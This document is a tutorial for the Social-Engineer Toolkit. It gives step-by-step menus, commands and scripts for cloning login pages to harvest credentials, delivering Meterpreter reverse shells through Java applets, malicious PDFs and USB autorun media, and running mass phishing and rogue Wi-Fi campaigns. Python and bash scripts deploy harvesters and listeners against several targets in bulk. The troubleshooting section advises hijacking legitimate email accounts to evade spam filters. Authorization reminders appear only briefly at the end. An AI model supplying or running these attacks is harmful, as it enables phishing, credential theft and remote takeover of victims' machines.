# SET Usage Examples and Tutorials

## Table of Contents

1. [Getting Started](#getting-started)
2. [Basic Attack Scenarios](#basic-attack-scenarios)
3. [Advanced Attack Combinations](#advanced-attack-combinations)
4. [Automation and Scripting](#automation-and-scripting)
5. [Troubleshooting Common Issues](#troubleshooting-common-issues)
6. [Best Practices](#best-practices)

## Getting Started

### Initial Setup and Configuration

#### 1. First-Time Setup

```bash
# Clone and install SET
git clone https://github.com/trustedsec/social-engineer-toolkit/ setoolkit/
cd setoolkit
pip3 install -r requirements.txt
python3 setup.py

# Start SET for first time
sudo ./setoolkit
```

#### 2. Basic Configuration

```bash
# Edit configuration file
sudo nano /etc/setoolkit/set.config

# Key settings to configure:
AUTO_DETECT=ON                    # Auto-detect IP address
WEBATTACK_PORT=80                # Web server port
APACHE_SERVER=ON                 # Use Apache instead of Python server
SENDMAIL=OFF                     # Email spoofing capability
METASPLOIT_PATH=/usr/share/metasploit-framework/
```

#### 3. Verify Installation

```bash
# Check Metasploit integration
msfconsole -v

# Check Apache installation
apache2 -v

# Check Python dependencies
python3 -c "import requests, pexpect, crypto; print('Dependencies OK')"
```

## Basic Attack Scenarios

### Scenario 1: Credential Harvesting Attack

**Objective**: Capture user credentials by cloning a login page.

#### Step-by-Step Process

```bash
# 1. Start SET
sudo ./setoolkit

# 2. Navigate through menus
# Select: 1) Social-Engineering Attacks
# Select: 2) Website Attack Vectors
# Select: 3) Credential Harvester Attack Method
# Select: 2) Site Cloner
```

#### Configuration Example

```bash
# When prompted for URL to clone:
Enter the url to clone: https://login.microsoftonline.com

# When prompted for IP address:
IP address for the POST back in Harvester: 192.168.1.100

# SET will:
# 1. Clone the Microsoft login page
# 2. Modify forms to capture credentials
# 3. Start web server on specified IP
# 4. Display captured credentials in real-time
```

#### Expected Output

```
[*] Cloning the website: https://login.microsoftonline.com
[*] This could take a little bit...
[*] Injecting Java Applet attack into the website.
[*] Filename obfuscated to: update.html
[*] Malicious java applet website prepped for deployment
[*] Starting Apache web server...
[*] Apache web server started.

# When victim submits credentials:
[*] WEB FORM POSTED TO: /common/oauth2/v2.0/authorize
[*] POSSIBLE USERNAME FIELD FOUND: login=victim@company.com
[*] POSSIBLE PASSWORD FIELD FOUND: passwd=SecretPassword123
[*] HOSTNAME INFORMATION GATHERED FROM: 192.168.1.50
```

### Scenario 2: Java Applet Attack

**Objective**: Deliver payload through malicious Java applet.

#### Configuration Process

```bash
# Menu Navigation:
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors  
# 1) Java Applet Attack Method
# 2) Site Cloner

# URL to clone: https://www.company.com/portal
# IP for reverse connection: 192.168.1.100
```

#### Payload Selection

```bash
# Payload options presented:
1) Windows Shell Reverse_TCP
2) Windows Meterpreter Reverse_TCP  
3) Windows Meterpreter Reverse_HTTP
4) Windows Meterpreter Reverse_HTTPS
5) Linux Shell Reverse_TCP

# Select payload: 2
# LHOST (listening host): 192.168.1.100
# LPORT (listening port): 4444
```

#### Metasploit Listener Setup

```bash
# In separate terminal, start Metasploit listener
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit -j
```

#### Attack Execution

```bash
# SET automatically:
# 1. Clones target website
# 2. Generates malicious Java applet
# 3. Signs applet with fake certificate
# 4. Injects applet into cloned site
# 5. Starts web server
# 6. Waits for victim connections

# When victim visits site and accepts Java applet:
# - Payload executes on victim machine
# - Meterpreter session established
# - Full system access achieved
```

### Scenario 3: Mass Email Campaign

**Objective**: Send phishing emails with malicious attachments.

#### Email Template Creation

```bash
# Menu Navigation:
# 1) Social-Engineering Attacks
# 5) Mass Mailer Attack

# Configure email settings:
# From address: it-support@company.com
# Subject: Critical Security Update Required
# Message body: Please install the attached security update immediately.
```

#### Attachment Creation

```bash
# Create malicious PDF:
# 1) Social-Engineering Attacks
# 1) Spear-Phishing Attack Vectors
# 2) Create a FileFormat Payload

# Select exploit:
# 1) Adobe PDF Embedded EXE Social Engineering
# Payload: Windows Meterpreter Reverse TCP
# LHOST: 192.168.1.100
# LPORT: 443
```

#### Recipient Configuration

```bash
# Email list format (emails.txt):
victim1@company.com
victim2@company.com  
victim3@company.com

# SMTP Configuration:
# Use built-in SMTP: Yes
# Gmail account: attacker@gmail.com
# Gmail password: [password]
# Target email list: /path/to/emails.txt
```

### Scenario 4: USB/CD Autorun Attack

**Objective**: Create malicious removable media.

#### Media Creation Process

```bash
# Menu Navigation:
# 1) Social-Engineering Attacks
# 3) Infectious Media Generator
# 1) File-Format Exploits
# 2) Standard Metasploit Executable

# Payload Configuration:
# Select: Windows Meterpreter Reverse TCP
# LHOST: 192.168.1.100
# LPORT: 8080

# Media Type:
# 1) USB/DVD/CD
# Select: 1
```

#### Generated Files

```bash
# SET creates:
# - autorun.inf (Windows autorun file)
# - payload.exe (malicious executable)
# - Legitimate-looking documents
# - Social engineering content

# File structure:
/media/
├── autorun.inf
├── setup.exe (payload)
├── readme.txt
├── documents/
│   ├── company_policy.pdf
│   └── employee_handbook.doc
└── software/
    └── required_update.msi
```

## Advanced Attack Combinations

### Multi-Vector Attack Campaign

**Objective**: Combine multiple attack vectors for maximum effectiveness.

#### Campaign Structure

```bash
# Phase 1: Reconnaissance
# - Google Analytics attack for target profiling
# - Social media intelligence gathering
# - Email address harvesting

# Phase 2: Initial Compromise
# - Spear-phishing with targeted content
# - Credential harvesting backup
# - USB drop at target location

# Phase 3: Lateral Movement
# - Teensy HID attacks on compromised systems
# - Wireless access point deployment
# - Additional payload delivery
```

#### Implementation Example

```bash
# 1. Start with credential harvesting
# Menu: 1 > 2 > 3 > 2
# Clone: https://company.com/login
# IP: 192.168.1.100

# 2. Simultaneously prepare email campaign  
# Menu: 1 > 5
# Target: Employees who haven't logged in
# Message: "Please verify your account"
# Link: http://192.168.1.100 (harvester site)

# 3. Create backup USB payloads
# Menu: 1 > 3 > 2
# Payload: Meterpreter HTTPS (stealth)
# Distribution: Physical drop near target

# 4. Deploy wireless attack
# Menu: 1 > 7 > 1  
# SSID: "Company_Guest_WiFi"
# Captive portal: Credential harvester
```

### Persistent Access Campaign

**Objective**: Establish multiple persistent access methods.

#### Multi-Stage Approach

```bash
# Stage 1: Initial Access (Java Applet)
# - High success rate
# - Immediate access
# - Deploy stage 2 payloads

# Stage 2: Persistence (PowerShell)
# - Registry persistence
# - Scheduled tasks
# - WMI event subscriptions

# Stage 3: Backup Access (HID)
# - Teensy-based backdoor
# - Physical access required
# - Independent of network security

# Stage 4: Network Pivot (Wireless)
# - Rogue access point
# - Internal network access
# - Additional target discovery
```

## Automation and Scripting

### Automated Attack Deployment

#### Using SET's Automation Features

```bash
# Create automation file (attack.set)
cat > attack.set << EOF
use 1
use 2
use 3
use 2
https://target.com/login
192.168.1.100
EOF

# Execute automated attack
./setoolkit --automation attack.set
```

#### Custom Python Integration

```python
#!/usr/bin/env python3
# custom_attack.py - Automated SET integration

import subprocess
import time
import os

def setup_credential_harvester(target_url, listen_ip):
    """Automate credential harvester setup"""
    
    # Create SET automation script
    automation_script = f"""
use 1
use 2  
use 3
use 2
{target_url}
{listen_ip}
"""
    
    with open('/tmp/set_automation.txt', 'w') as f:
        f.write(automation_script)
    
    # Execute SET with automation
    process = subprocess.Popen([
        'sudo', './setoolkit', 
        '--automation', '/tmp/set_automation.txt'
    ], cwd='/path/to/setoolkit')
    
    return process

def setup_metasploit_listener(lhost, lport):
    """Setup Metasploit listener"""
    
    msf_commands = f"""
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST {lhost}
set LPORT {lport}
exploit -j
"""
    
    with open('/tmp/msf_setup.rc', 'w') as f:
        f.write(msf_commands)
    
    subprocess.Popen([
        'msfconsole', '-r', '/tmp/msf_setup.rc'
    ])

def main():
    # Configuration
    target_url = "https://login.company.com"
    listen_ip = "192.168.1.100"
    listen_port = "4444"
    
    print("[+] Starting automated attack...")
    
    # Setup Metasploit listener
    print("[+] Setting up Metasploit listener...")
    setup_metasploit_listener(listen_ip, listen_port)
    time.sleep(5)
    
    # Setup credential harvester
    print("[+] Setting up credential harvester...")
    harvester_process = setup_credential_harvester(target_url, listen_ip)
    
    print("[+] Attack deployed successfully!")
    print(f"[+] Harvester URL: http://{listen_ip}")
    print(f"[+] Metasploit listener: {listen_ip}:{listen_port}")
    
    # Monitor for results
    try:
        harvester_process.wait()
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user")
        harvester_process.terminate()

if __name__ == "__main__":
    main()
```

### Batch Processing Multiple Targets

```bash
#!/bin/bash
# batch_attack.sh - Process multiple targets

# Target list
TARGETS=(
    "https://company1.com/login"
    "https://company2.com/portal" 
    "https://company3.com/auth"
)

# Base IP for listeners
BASE_IP="192.168.1"
PORT_START=8000

# Process each target
for i in "${!TARGETS[@]}"; do
    TARGET="${TARGETS[$i]}"
    LISTEN_IP="${BASE_IP}.$((100 + i))"
    LISTEN_PORT=$((PORT_START + i))
    
    echo "[+] Processing target: $TARGET"
    echo "[+] Listener: $LISTEN_IP:$LISTEN_PORT"
    
    # Create automation script for this target
    cat > "/tmp/attack_${i}.set" << EOF
use 1
use 2
use 3
use 2
$TARGET
$LISTEN_IP
EOF
    
    # Start attack in background
    sudo ./setoolkit --automation "/tmp/attack_${i}.set" &
    
    # Setup corresponding Metasploit listener
    cat > "/tmp/msf_${i}.rc" << EOF
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LISTEN_IP
set LPORT $LISTEN_PORT
exploit -j
EOF
    
    msfconsole -r "/tmp/msf_${i}.rc" &
    
    sleep 10  # Delay between deployments
done

echo "[+] All attacks deployed!"
```

## Troubleshooting Common Issues

### Network Configuration Issues

#### Problem: "Cannot bind to port 80"

```bash
# Solution 1: Check if port is in use
sudo netstat -tulpn | grep :80

# Solution 2: Kill conflicting process
sudo pkill apache2
sudo pkill nginx

# Solution 3: Use alternative port
# Edit /etc/setoolkit/set.config
WEBATTACK_PORT=8080
```

#### Problem: "Auto-detect IP failed"

```bash
# Solution: Manual IP configuration
# Edit /etc/setoolkit/set.config
AUTO_DETECT=OFF

# Or specify IP during attack setup
# When prompted: Enter IP address: 192.168.1.100
```

### Metasploit Integration Issues

#### Problem: "Metasploit not found"

```bash
# Solution 1: Install Metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall

# Solution 2: Update SET configuration
# Edit /etc/setoolkit/set.config
METASPLOIT_PATH=/opt/metasploit-framework/
```

#### Problem: "Payload generation failed"

```bash
# Solution 1: Check Metasploit database
msfdb init
msfdb start

# Solution 2: Verify payload compatibility
msfvenom --list payloads | grep windows/meterpreter

# Solution 3: Use alternative payload
# Select different payload type in SET menu
```

### Web Server Issues

#### Problem: "Apache failed to start"

```bash
# Solution 1: Check Apache configuration
sudo apache2ctl configtest

# Solution 2: Check for conflicting services
sudo systemctl status apache2
sudo systemctl stop nginx

# Solution 3: Use Python web server
# Edit /etc/setoolkit/set.config
APACHE_SERVER=OFF
```

#### Problem: "Website cloning failed"

```bash
# Solution 1: Check network connectivity
curl -I https://target.com

# Solution 2: Handle SSL/TLS issues
# Use HTTP instead of HTTPS for testing
# Or add SSL certificate handling

# Solution 3: Manual website download
wget -r -p -k https://target.com
# Then use "Import your own site" option
```

### Email Delivery Issues

#### Problem: "SMTP authentication failed"

```bash
# Solution 1: Enable app passwords (Gmail)
# Go to Google Account settings
# Security > App passwords
# Generate password for SET

# Solution 2: Use external SMTP server
# Configure custom SMTP in SET
# Host: smtp.company.com
# Port: 587
# Authentication: Yes
```

#### Problem: "Emails marked as spam"

```bash
# Solution 1: Improve email content
# - Use legitimate-looking sender addresses
# - Include proper email headers
# - Avoid spam trigger words

# Solution 2: Use compromised email accounts
# - Hijack legitimate email accounts
# - Send from trusted domains
# - Maintain conversation threads

# Solution 3: Email reputation management
# - Warm up sender reputation
# - Use multiple sender addresses
# - Implement SPF/DKIM records
```

## Best Practices

### Pre-Engagement Planning

#### 1. Scope Definition

```bash
# Define clear boundaries:
# - Target IP ranges: 192.168.1.0/24, 10.0.0.0/8
# - Authorized domains: company.com, subsidiary.com
# - Excluded systems: production databases, critical infrastructure
# - Time windows: Business hours only, weekends excluded
# - Attack vectors: Web attacks only, no physical access
```

#### 2. Documentation Requirements

```bash
# Maintain detailed logs:
# - All commands executed
# - Timestamps of activities  
# - Systems accessed
# - Data viewed/extracted
# - Cleanup actions performed

# Log file example:
2023-10-29 09:15:32 - Started credential harvester for login.company.com
2023-10-29 09:16:45 - Web server started on 192.168.1.100:80
2023-10-29 10:22:18 - Credentials captured: user@company.com
2023-10-29 10:22:19 - Immediately logged out of captured session
2023-10-29 11:30:00 - Attack concluded, web server stopped
```

### Operational Security

#### 1. Attack Infrastructure

```bash
# Use isolated attack systems:
# - Dedicated attack VM/container
# - Separate network segment
# - No production system access
# - Regular system rebuilds

# Network isolation example:
# Attack VM: 192.168.100.10
# Target network: 192.168.1.0/24  
# Management network: 10.0.0.0/24
# No cross-network access allowed
```

#### 2. Data Handling

```bash
# Secure data practices:
# - Encrypt all captured data
# - Use secure communication channels
# - Implement data retention policies
# - Secure deletion of temporary files

# Example secure cleanup:
shred -vfz -n 3 /tmp/captured_credentials.txt
rm -rf ~/.set/reports/*
history -c
```

### Legal and Ethical Considerations

#### 1. Authorization Verification

```bash
# Before any testing:
# - Verify written authorization
# - Confirm scope boundaries
# - Establish communication protocols
# - Define emergency procedures
# - Review legal requirements
```

#### 2. Responsible Disclosure

```bash
# Post-engagement requirements:
# - Immediate notification of critical findings
# - Secure evidence handling
# - Detailed remediation guidance
# - Follow-up verification testing
# - Knowledge transfer to client team
```

### Performance Optimization

#### 1. Resource Management

```bash
# Optimize SET performance:
# - Use SSD storage for faster cloning
# - Allocate sufficient RAM (minimum 4GB)
# - Use wired network connections
# - Close unnecessary applications

# System monitoring:
htop                    # Monitor CPU/memory usage
iotop                   # Monitor disk I/O
nethogs                 # Monitor network usage
```

#### 2. Attack Efficiency

```bash
# Maximize success rates:
# - Research targets thoroughly
# - Use current exploit techniques
# - Customize social engineering content
# - Test attacks in lab environment
# - Monitor attack effectiveness

# Success metrics tracking:
# - Email open rates
# - Link click rates  
# - Payload execution rates
# - Credential capture rates
# - System compromise rates
```

---

*This guide provides practical examples for using SET effectively and responsibly. Always ensure proper authorization and follow ethical guidelines when conducting security assessments.*